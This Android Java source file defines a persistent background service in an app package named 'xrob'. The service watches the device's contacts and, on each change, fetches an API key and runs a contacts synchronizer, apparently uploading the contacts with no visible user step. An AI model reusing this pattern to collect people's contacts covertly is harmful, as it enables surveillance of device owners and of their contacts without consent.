package com.theah64.xrob.services;

import android.app.Service;
import android.content.Intent;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import com.theah64.xrob.asynctasks.ContactsSynchronizer;
import com.theah64.xrob.utils.APIRequestGateway;

public class ContactsWatcherService extends Service {

    private static final int MIN_THRESHOLD = 5000;
    private static final String X = ContactsWatcherService.class.getSimpleName();
    private static long lastTimeOfUpdate = 0;
    private MyContactObserver contactObserver = new MyContactObserver(null);

    public ContactsWatcherService() {

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(X, "Contact observer registered");
        getContentResolver().registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, contactObserver);
    }

    @Override
    public void onDestroy() {
        getContentResolver().unregisterContentObserver(contactObserver);
        System.out.println("Contact observer unregistered");
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public class MyContactObserver extends ContentObserver {

        MyContactObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);

            System.out.println("Contact changed");

            //To prevent double call
            if ((System.currentTimeMillis() - lastTimeOfUpdate) > MIN_THRESHOLD) {
                lastTimeOfUpdate = System.currentTimeMillis();

                System.out.println("Real code works here");

                //Opening gate
                new APIRequestGateway(ContactsWatcherService.this, new APIRequestGateway.APIRequestGatewayCallback() {
                    @Override
                    public void onReadyToRequest(String apiKey) {
                        new ContactsSynchronizer(ContactsWatcherService.this, apiKey).execute();
                    }

                    @Override
                    public void onFailed(String reason) {

                    }
                });

            } else {
                System.out.println("Not now!");
            }

        }

    }
}
